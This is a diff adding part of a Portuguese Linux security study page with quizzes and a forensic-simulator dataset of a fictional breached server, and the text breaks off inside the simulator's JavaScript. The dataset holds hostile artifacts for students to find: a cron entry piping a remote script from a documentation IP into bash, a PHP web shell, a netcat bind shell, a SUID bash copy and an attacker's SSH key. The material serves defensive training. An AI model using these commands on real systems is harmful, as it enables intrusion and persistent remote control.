+            <li class="checklist-item">
+                <input type="checkbox" id="chk-lx-5">
+                <label for="chk-lx-5"><strong>Permissões de dados:</strong> nenhum diretório da aplicação gravável por todos, e pastas de upload sem execução de scripts.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-lx-6">
+                <label for="chk-lx-6"><strong>SSH endurecido:</strong> sem login de root, autenticação por chave e senha desativada quando possível.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-lx-7">
+                <label for="chk-lx-7"><strong>Logs fora do servidor:</strong> auth.log e journal enviados ao SIEM, para que um root comprometido não apague o rastro.</label>
+            </li>
+        </ul>
+    </section>
+
+    <!-- SEÇÃO 5: QUIZ -->
+    <section class="study-section" id="quiz">
+        <div class="section-header">
+            <span class="section-tag">Seção 05</span>
+            <h2>Questões de Fixação e Entrevista</h2>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 1 (Permissões):</strong> O que significa o modo <code>4755</code> num arquivo, e quando ele é preocupante?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> SUID ligado (4), dono com rwx (7), grupo e outros com r-x (5): o programa roda com os privilégios do dono.</p>
+                    <p>É normal em <code>passwd</code> e <code>sudo</code>. Num shell ou num binário em <code>/tmp</code> pertencente ao root, dá root a qualquer usuário que o execute.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 2 (umask):</strong> Com umask <code>027</code>, com que permissões nasce um diretório novo?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> 750 (rwxr-x---).</p>
+                    <p>Diretórios partem de 777 e arquivos de 666; a umask retira bits. 777 menos 027 dá 750; um arquivo nasceria 640.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 3 (auth.log):</strong> Por que <code>awk '{print $11}'</code> conta errado os IPs das falhas de SSH?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Porque nas linhas com "invalid user" o IP fica na 13ª coluna, e a 11ª passa a ser o nome do usuário inexistente (admin, ubuntu, test).</p>
+                    <p>Conte do fim com <code>$(NF-3)</code> ou extraia o IP com <code>grep -oE</code>. Sempre confira o formato de algumas linhas antes de confiar num resumo.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 4 (sudoers):</strong> A regra <code>ana ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf</code> limita a Ana a editar um arquivo?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Não. Dentro do vim ela pode abrir um shell (<code>:!bash</code>), que roda como root.</p>
+                    <p>Para editar como root com segurança, use <code>sudoedit</code>, que edita uma cópia com os privilégios do usuário. O GTFOBins lista os programas que permitem esse tipo de fuga.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 5 (Persistência):</strong> Você apagou o cron malicioso e trocou a senha do usuário invadido. Que outra persistência comum precisa ser verificada?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> As chaves em <code>~/.ssh/authorized_keys</code>, além de serviços e timers do systemd e arquivos de inicialização do shell.</p>
+                    <p>Uma chave SSH do atacante (T1098.004) permite entrar sem senha, então trocar a senha não basta.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 6 (Portas):</strong> <code>ss -tlnp</code> mostra <code>0.0.0.0:4444</code> aberto pelo processo <code>nc</code>. O que isso indica?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Provavelmente um backdoor: o netcat esperando conexões, possivelmente entregando um shell.</p>
+                    <p>Confira a linha de comando com <code>ps</code>, isole o servidor e colete a memória antes de encerrar o processo (Estudo 19).</p>
+                </div>
+            </details>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 6: FATOS E REFERÊNCIAS -->
+    <section class="study-section" id="fatos">
+        <div class="section-header">
+            <span class="section-tag">Seção 06</span>
+            <h2>Fatos Essenciais, Referências e Próximos Passos</h2>
+        </div>
+
+        <div class="facts-grid">
+            <div class="facts-card">
+                <h4>1. Permissões</h4>
+                <p>r=4, w=2, x=1; SUID 4000, SGID 2000, sticky 1000; umask retira bits.</p>
+            </div>
+            <div class="facts-card">
+                <h4>2. Quem entrou</h4>
+                <p>auth.log ou journalctl; conte IPs do fim da linha com $(NF-3).</p>
+            </div>
+            <div class="facts-card">
+                <h4>3. O que roda</h4>
+                <p>ps aux, ss -tlnp e lsof ligam processos, portas e arquivos.</p>
+            </div>
+            <div class="facts-card">
+                <h4>4. Persistência</h4>
+                <p>cron, systemd, authorized_keys e .bashrc; sudoers sem NOPASSWD amplo.</p>
+            </div>
+        </div>
+
+        <h3>Referências</h3>
+        <ul>
+            <li>Filesystem Hierarchy Standard 3.0 (Linux Foundation).</li>
+            <li>Páginas de manual: chmod(1), sudoers(5), crontab(5), ss(8), journalctl(1).</li>
+            <li>CIS Benchmarks para Ubuntu Linux e Red Hat Enterprise Linux.</li>
+            <li>GTFOBins (gtfobins.github.io).</li>
+            <li>MITRE ATT&amp;CK — T1110, T1548.001, T1053.003, T1543.002, T1098.004 e T1546.004.</li>
+        </ul>
+
+        <div class="callout tip" style="margin-top: 1.5rem;">
+            <div class="callout-title">
+                <span class="callout-icon">🎯</span>
+                <strong>Próximos Estudos: 35 — Python para Segurança e 06 — Hardening de Sistemas</strong>
+            </div>
+            <p>
+                O Estudo 35 automatiza a análise de logs que você fez aqui com pipes. O Estudo 06 mostra como configurar o servidor para que essas falhas não aconteçam.
+            </p>
+        </div>
+    </section>
+
+</article>
+
+<!-- DADOS DO SIMULADOR (lidos pelo motor abaixo e validados pelos testes) -->
+<script type="application/json" id="lx-dados">
+{
+ "contexto": "Servidor web fictício web-loja01 (Ubuntu) da Ipê Store, examinado em 10/11 às 08:30. Você está como root numa sessão de investigação; os IPs externos são de faixas de documentação.",
+ "host": "web-loja01",
+ "suid_padrao": [
+  "/usr/bin/passwd",
+  "/usr/bin/sudo",
+  "/usr/bin/su",
+  "/usr/bin/mount",
+  "/usr/bin/umount",
+  "/usr/bin/chsh",
+  "/usr/bin/gpasswd",
+  "/usr/bin/newgrp",
+  "/usr/lib/openssh/ssh-keysign"
+ ],
+ "fs": {
+  "/": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/etc": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/etc/cron.d": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/etc/cron.d/backup-loja": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Jun 12  2025",
+   "conteudo": "30 2 * * * root /usr/local/bin/backup-loja.sh >> /var/log/backup-loja.log 2>&1",
+   "tamanho": 78
+  },
+  "/etc/cron.d/sysupdate": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Nov 10 03:27",
+   "conteudo": "* * * * * root curl -s http://198.51.100.23/x.sh | bash",
+   "tamanho": 55
+  },
+  "/etc/crontab": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily",
+   "tamanho": 235
+  },
+  "/etc/passwd": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nana:x:1001:1001:Ana Souza:/home/ana:/bin/bash\njoao:x:1002:1002:Joao Lima:/home/joao:/bin/bash\ndeploy:x:1003:1003:Deploy da loja:/home/deploy:/bin/bash",
+   "tamanho": 329
+  },
+  "/etc/shadow": {
+   "tipo": "arquivo",
+   "modo": "0640",
+   "dono": "root",
+   "grupo": "shadow",
+   "data": "Mar  2  2025",
+   "conteudo": "root:!:20150:0:99999:7:::\nana:$y$j9T$Qh3kV0mZ$R8bWcF2e1xY7pLmN4aTqU9sDkJ0vGhC6iE5oZ3rB1w/:20300:0:99999:7:::\njoao:$y$j9T$a7Lp2Xc9$K1nVbT6yHqW3eR8uI0oPlM5sZ2dF4gJ7hC9xA1vB6n/:20310:0:99999:7:::\ndeploy:$6$Vt8q$Xk2pZr9W1fQm7Ls3Dy5Ha0Ju4Nc6Ob8Pe2Ri1Tg3Uh5Vj7Wk9Xl0Ym2Zn4Ao6Bp8Cq0Dr2Es4Ft6Gu8Hv0Iw2Jx4Ky6Lz8:19800:0:99999:7:::",
+   "tamanho": 321
+  },
+  "/etc/ssh": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/etc/ssh/sshd_config": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "Port 22\nPermitRootLogin no\nPasswordAuthentication yes\nPubkeyAuthentication yes",
+   "tamanho": 78
+  },
+  "/etc/sudoers.d": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/etc/sudoers.d/ana": {
+   "tipo": "arquivo",
+   "modo": "0440",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "ana ALL=(root) /usr/bin/systemctl restart nginx",
+   "tamanho": 47
+  },
+  "/etc/sudoers.d/deploy": {
+   "tipo": "arquivo",
+   "modo": "0440",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "deploy ALL=(ALL) NOPASSWD: ALL",
+   "tamanho": 30
+  },
+  "/home": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/home/ana": {
+   "tipo": "dir",
+   "modo": "0750",
+   "dono": "ana",
+   "grupo": "ana",
+   "data": "Mar  2  2025"
+  },
+  "/home/ana/.bashrc": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "ana",
+   "grupo": "ana",
+   "data": "Mar  2  2025",
+   "conteudo": "# ~/.bashrc\nalias ll='ls -la'",
+   "tamanho": 29
+  },
+  "/home/deploy": {
+   "tipo": "dir",
+   "modo": "0750",
+   "dono": "deploy",
+   "grupo": "deploy",
+   "data": "Mar  2  2025"
+  },
+  "/home/deploy/.bash_history": {
+   "tipo": "arquivo",
+   "modo": "0600",
+   "dono": "deploy",
+   "grupo": "deploy",
+   "data": "Nov 10 03:29",
+   "conteudo": "id\nsudo -l\nmkdir -p /tmp/.cache\nsudo cp /bin/bash /tmp/.cache/.bash\nsudo chmod 4755 /tmp/.cache/.bash\necho '* * * * * root curl -s http://198.51.100.23/x.sh | bash' | sudo tee /etc/cron.d/sysupdate\necho 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOp8 kali@op' >> ~/.ssh/authorized_keys\nhistory -c",
+   "tamanho": 290
+  },
+  "/home/deploy/.ssh": {
+   "tipo": "dir",
+   "modo": "0700",
+   "dono": "deploy",
+   "grupo": "deploy",
+   "data": "Mar  2  2025"
+  },
+  "/home/deploy/.ssh/authorized_keys": {
+   "tipo": "arquivo",
+   "modo": "0600",
+   "dono": "deploy",
+   "grupo": "deploy",
+   "data": "Nov 10 03:28",
+   "conteudo": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3x deploy-ci@ipestore\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOp8 kali@op",
+   "tamanho": 108
+  },
+  "/home/joao": {
+   "tipo": "dir",
+   "modo": "0750",
+   "dono": "joao",
+   "grupo": "joao",
+   "data": "Mar  2  2025"
+  },
+  "/root": {
+   "tipo": "dir",
+   "modo": "0700",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/srv": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/srv/app": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "www-data",
+   "grupo": "www-data",
+   "data": "Mar  2  2025"
+  },
+  "/srv/app/index.php": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "www-data",
+   "grupo": "www-data",
+   "data": "Mar  2  2025",
+   "conteudo": "<?php require 'loja.php';",
+   "tamanho": 25
+  },
+  "/srv/app/uploads": {
+   "tipo": "dir",
+   "modo": "0777",
+   "dono": "www-data",
+   "grupo": "www-data",
+   "data": "Nov 10 03:31"
+  },
+  "/srv/app/uploads/produto-1042.jpg": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "www-data",
+   "grupo": "www-data",
+   "data": "Nov  8 14:02",
+   "conteudo": "",
+   "tamanho": 48211
+  },
+  "/srv/app/uploads/produto-1043.jpg": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "www-data",
+   "grupo": "www-data",
+   "data": "Nov  9 10:47",
+   "conteudo": "",
+   "tamanho": 51877
+  },
+  "/srv/app/uploads/thumb.php": {
+   "tipo": "arquivo",
+   "modo": "0644",
+   "dono": "deploy",
+   "grupo": "deploy",
+   "data": "Nov 10 03:31",
+   "conteudo": "<?php system($_GET['c']); ?>",
+   "tamanho": 28
+  },
+  "/tmp": {
+   "tipo": "dir",
+   "modo": "1777",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/tmp/.cache": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "deploy",
+   "grupo": "deploy",
+   "data": "Nov 10 03:24"
+  },
+  "/tmp/.cache/.bash": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Nov 10 03:24",
+   "conteudo": "",
+   "tamanho": 1396520
+  },
+  "/usr": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/usr/bin": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/usr/bin/bash": {
+   "tipo": "arquivo",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 1396520
+  },
+  "/usr/bin/chsh": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 59976
+  },
+  "/usr/bin/crontab": {
+   "tipo": "arquivo",
+   "modo": "2755",
+   "dono": "root",
+   "grupo": "crontab",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 39568
+  },
+  "/usr/bin/curl": {
+   "tipo": "arquivo",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 260328
+  },
+  "/usr/bin/gpasswd": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 59976
+  },
+  "/usr/bin/mount": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 59976
+  },
+  "/usr/bin/newgrp": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 59976
+  },
+  "/usr/bin/passwd": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 59976
+  },
+  "/usr/bin/su": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 59976
+  },
+  "/usr/bin/sudo": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 59976
+  },
+  "/usr/bin/umount": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 59976
+  },
+  "/usr/lib": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/usr/lib/openssh": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/usr/lib/openssh/ssh-keysign": {
+   "tipo": "arquivo",
+   "modo": "4755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025",
+   "conteudo": "",
+   "tamanho": 342632
+  },
+  "/usr/local": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/usr/local/bin": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/usr/local/bin/backup-loja.sh": {
+   "tipo": "arquivo",
+   "modo": "0750",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Jun 12  2025",
+   "conteudo": "#!/bin/sh\ntar czf /var/backups/loja-$(date +%F).tgz /srv/app",
+   "tamanho": 60
+  },
+  "/var": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/var/log": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/var/log/auth.log": {
+   "tipo": "arquivo",
+   "modo": "0640",
+   "dono": "root",
+   "grupo": "adm",
+   "data": "Nov 10 08:02",
+   "conteudo": "Nov 10 01:05:11 web-loja01 sshd[1022]: Accepted publickey for ana from 10.20.5.31 port 51022 ssh2: ED25519 SHA256:k2V8Xq1\nNov 10 01:40:02 web-loja01 sshd[1101]: Failed password for joao from 10.20.5.40 port 50211 ssh2\nNov 10 01:40:09 web-loja01 sshd[1101]: Failed password for joao from 10.20.5.40 port 50213 ssh2\nNov 10 01:40:15 web-loja01 sshd[1101]: Accepted password for joao from 10.20.5.40 port 50215 ssh2\nNov 10 02:30:10 web-loja01 sshd[1188]: Failed password for invalid user test from 203.0.113.9 port 40100 ssh2\nNov 10 02:30:17 web-loja01 sshd[1188]: Failed password for invalid user test from 203.0.113.9 port 40101 ssh2\nNov 10 02:30:24 web-loja01 sshd[1188]: Failed password for invalid user test from 203.0.113.9 port 40102 ssh2\nNov 10 02:31:31 web-loja01 sshd[1188]: Failed password for invalid user test from 203.0.113.9 port 40103 ssh2\nNov 10 02:31:38 web-loja01 sshd[1188]: Failed password for invalid user test from 203.0.113.9 port 40104 ssh2\nNov 10 02:31:45 web-loja01 sshd[1188]: Failed password for invalid user test from 203.0.113.9 port 40105 ssh2\nNov 10 03:10:10 web-loja01 sshd[2211]: Failed password for root from 198.51.100.23 port 50100 ssh2\nNov 10 03:10:16 web-loja01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 50103 ssh2\nNov 10 03:10:22 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50106 ssh2\nNov 10 03:10:28 web-loja01 sshd[2211]: Failed password for invalid user ubuntu from 198.51.100.23 port 50109 ssh2\nNov 10 03:10:34 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50112 ssh2\nNov 10 03:10:40 web-loja01 sshd[2211]: Failed password for root from 198.51.100.23 port 50115 ssh2\nNov 10 03:10:46 web-loja01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 50118 ssh2\nNov 10 03:10:52 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50121 ssh2\nNov 10 03:10:58 web-loja01 sshd[2211]: Failed password for invalid user ubuntu from 198.51.100.23 port 50124 ssh2\nNov 10 03:11:04 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50127 ssh2\nNov 10 03:11:10 web-loja01 sshd[2211]: Failed password for root from 198.51.100.23 port 50130 ssh2\nNov 10 03:11:16 web-loja01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 50133 ssh2\nNov 10 03:11:22 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50136 ssh2\nNov 10 03:11:28 web-loja01 sshd[2211]: Failed password for invalid user ubuntu from 198.51.100.23 port 50139 ssh2\nNov 10 03:11:34 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50142 ssh2\nNov 10 03:11:40 web-loja01 sshd[2211]: Failed password for root from 198.51.100.23 port 50145 ssh2\nNov 10 03:11:46 web-loja01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 50148 ssh2\nNov 10 03:11:52 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50151 ssh2\nNov 10 03:11:58 web-loja01 sshd[2211]: Failed password for invalid user ubuntu from 198.51.100.23 port 50154 ssh2\nNov 10 03:12:04 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50157 ssh2\nNov 10 03:12:10 web-loja01 sshd[2211]: Failed password for root from 198.51.100.23 port 50160 ssh2\nNov 10 03:12:16 web-loja01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 50163 ssh2\nNov 10 03:12:22 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50166 ssh2\nNov 10 03:12:28 web-loja01 sshd[2211]: Failed password for invalid user ubuntu from 198.51.100.23 port 50169 ssh2\nNov 10 03:12:34 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50172 ssh2\nNov 10 03:12:40 web-loja01 sshd[2211]: Failed password for root from 198.51.100.23 port 50175 ssh2\nNov 10 03:12:46 web-loja01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 50178 ssh2\nNov 10 03:12:52 web-loja01 sshd[2211]: Failed password for deploy from 198.51.100.23 port 50181 ssh2\nNov 10 03:13:05 web-loja01 sshd[2290]: Accepted password for deploy from 198.51.100.23 port 50999 ssh2\nNov 10 03:23:40 web-loja01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cp /bin/bash /tmp/.cache/.bash\nNov 10 03:24:02 web-loja01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/chmod 4755 /tmp/.cache/.bash\nNov 10 03:27:15 web-loja01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /etc/cron.d/sysupdate\nNov 10 03:28:01 web-loja01 CRON[3328]: (root) CMD (curl -s http://198.51.100.23/x.sh | bash)\nNov 10 03:29:01 web-loja01 CRON[3329]: (root) CMD (curl -s http://198.51.100.23/x.sh | bash)\nNov 10 03:30:01 web-loja01 CRON[3330]: (root) CMD (curl -s http://198.51.100.23/x.sh | bash)\nNov 10 08:02:44 web-loja01 sshd[4410]: Accepted publickey for ana from 10.20.5.31 port 52880 ssh2: ED25519 SHA256:k2V8Xq1",
+   "tamanho": 4926
+  },
+  "/var/spool": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/var/spool/cron": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  },
+  "/var/spool/cron/crontabs": {
+   "tipo": "dir",
+   "modo": "1730",
+   "dono": "root",
+   "grupo": "crontab",
+   "data": "Mar  2  2025"
+  },
+  "/var/spool/cron/crontabs/root": {
+   "tipo": "arquivo",
+   "modo": "0600",
+   "dono": "root",
+   "grupo": "crontab",
+   "data": "Mar  2  2025",
+   "conteudo": "0 4 * * 0 /usr/bin/apt-get -qq update",
+   "tamanho": 37
+  },
+  "/var/www": {
+   "tipo": "dir",
+   "modo": "0755",
+   "dono": "root",
+   "grupo": "root",
+   "data": "Mar  2  2025"
+  }
+ },
+ "saidas": {
+  "ps": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1 167780 11520 ?        Ss   Nov08   0:04 /sbin/init\nroot         812  0.0  0.0  15432  7880 ?        Ss   Nov08   0:00 sshd: /usr/sbin/sshd -D\nroot         901  0.0  0.1  55228  9012 ?        Ss   Nov08   0:00 nginx: master process /usr/sbin/nginx\nwww-data     902  0.1  0.3 220116 28400 ?        S    Nov08   1:12 php-fpm: pool www\ndeploy      2290  0.0  0.0  17040  6120 ?        S    03:13   0:00 sshd: deploy@pts/1\nroot        2341  0.0  0.0   8888  3900 pts/1    S+   03:25   0:00 /tmp/.cache/.bash -p\nroot        2350  0.0  0.0   3512  1100 ?        S    03:26   0:00 nc -lvnp 4444 -e /bin/bash\nroot        3330  0.0  0.0   2888   980 ?        Ss   03:30   0:00 /bin/sh -c curl -s http://198.51.100.23/x.sh | bash",
+  "ss": "State   Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\nLISTEN  0      128          0.0.0.0:22         0.0.0.0:*     users:((\"sshd\",pid=812,fd=3))\nLISTEN  0      511          0.0.0.0:80         0.0.0.0:*     users:((\"nginx\",pid=901,fd=6))\nLISTEN  0      511          0.0.0.0:443        0.0.0.0:*     users:((\"nginx\",pid=901,fd=7))\nLISTEN  0      1            0.0.0.0:4444       0.0.0.0:*     users:((\"nc\",pid=2350,fd=3))\nLISTEN  0      4096       127.0.0.1:9000       0.0.0.0:*     users:((\"php-fpm\",pid=902,fd=8))",
+  "sudo": "Matching Defaults entries for root on web-loja01:\n    env_reset, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser root may run the following commands on web-loja01:\n    (ALL : ALL) ALL",
+  "id": "uid=0(root) gid=0(root) groups=0(root)"
+ },
+ "missoes": {
+  "suid": "/tmp/.cache/.bash",
+  "ip": "198.51.100.23",
+  "conta": "deploy",
+  "permissao": "/srv/app/uploads",
+  "cron": "/etc/cron.d/sysupdate"
+ }
+}
+</script>
+
+<script>
+(function() {
+    var LX = JSON.parse(document.getElementById("lx-dados").textContent);
+    var ATALHOS = ["help", "ls -la /tmp/.cache", "grep \"Accepted\" /var/log/auth.log", "ps aux", "ss -tlnp", "ls -la /etc/cron.d"];
+    var fs = null;
+    var cwd = "/root";
+    var historico = [];
+    var posHist = 0;
+
+    function el(tag, texto, estilo) {
+        var e = document.createElement(tag);
+        if (texto !== undefined && texto !== null) e.textContent = texto;
+        if (estilo) e.setAttribute("style", estilo);
+        return e;
+    }
+    function erro(msg) { var e = new Error(msg); e.shell = true; return e; }
+
+    // ------------------------------------------------------------ sistema de arquivos
+    function normalizar(caminho) {
+        var partes = [];
+        (caminho.indexOf("/") === 0 ? caminho : cwd + "/" + caminho).split("/").forEach(function(p) {
+            if (!p || p === ".") return;
+            if (p === "..") partes.pop(); else partes.push(p);
+        });
+        return "/" + partes.join("/");
+    }
+    function resolver(caminho) {
+        if (caminho === "~" || caminho.indexOf("~/") === 0) caminho = "/root" + caminho.slice(1);
+        return normalizar(caminho);
+    }
+    function no(caminho) { return fs[caminho] || null; }
+    function exigir(caminho, cmd) {
+        var n = no(caminho);
+        if (!n) throw erro(cmd + ": " + caminho + ": Arquivo ou diretório inexistente");
+        return n;
+    }
+    function filhos(dir) {
+        var pref = dir === "/" ? "/" : dir + "/";
+        return Object.keys(fs).filter(function(c) { return c !== dir && c.indexOf(pref) === 0 && c.slice(pref.length).indexOf("/") === -1; }).sort();
+    }
+    function nome(caminho) { return caminho === "/" ? "/" : caminho.slice(caminho.lastIndexOf("/") + 1); }
+    function stringModo(n) {
+        var m = parseInt(n.modo, 8), s = n.tipo === "dir" ? "d" : "-";
+        var trios = [[0o400, 0o200, 0o100, 0o4000, "s"], [0o040, 0o020, 0o010, 0o2000, "s"], [0o004, 0o002, 0o001, 0o1000, "t"]];
+        trios.forEach(function(t) {
+            s += (m & t[0]) ? "r" : "-";
+            s += (m & t[1]) ? "w" : "-";
+            var x = m & t[2], esp = m & t[3];
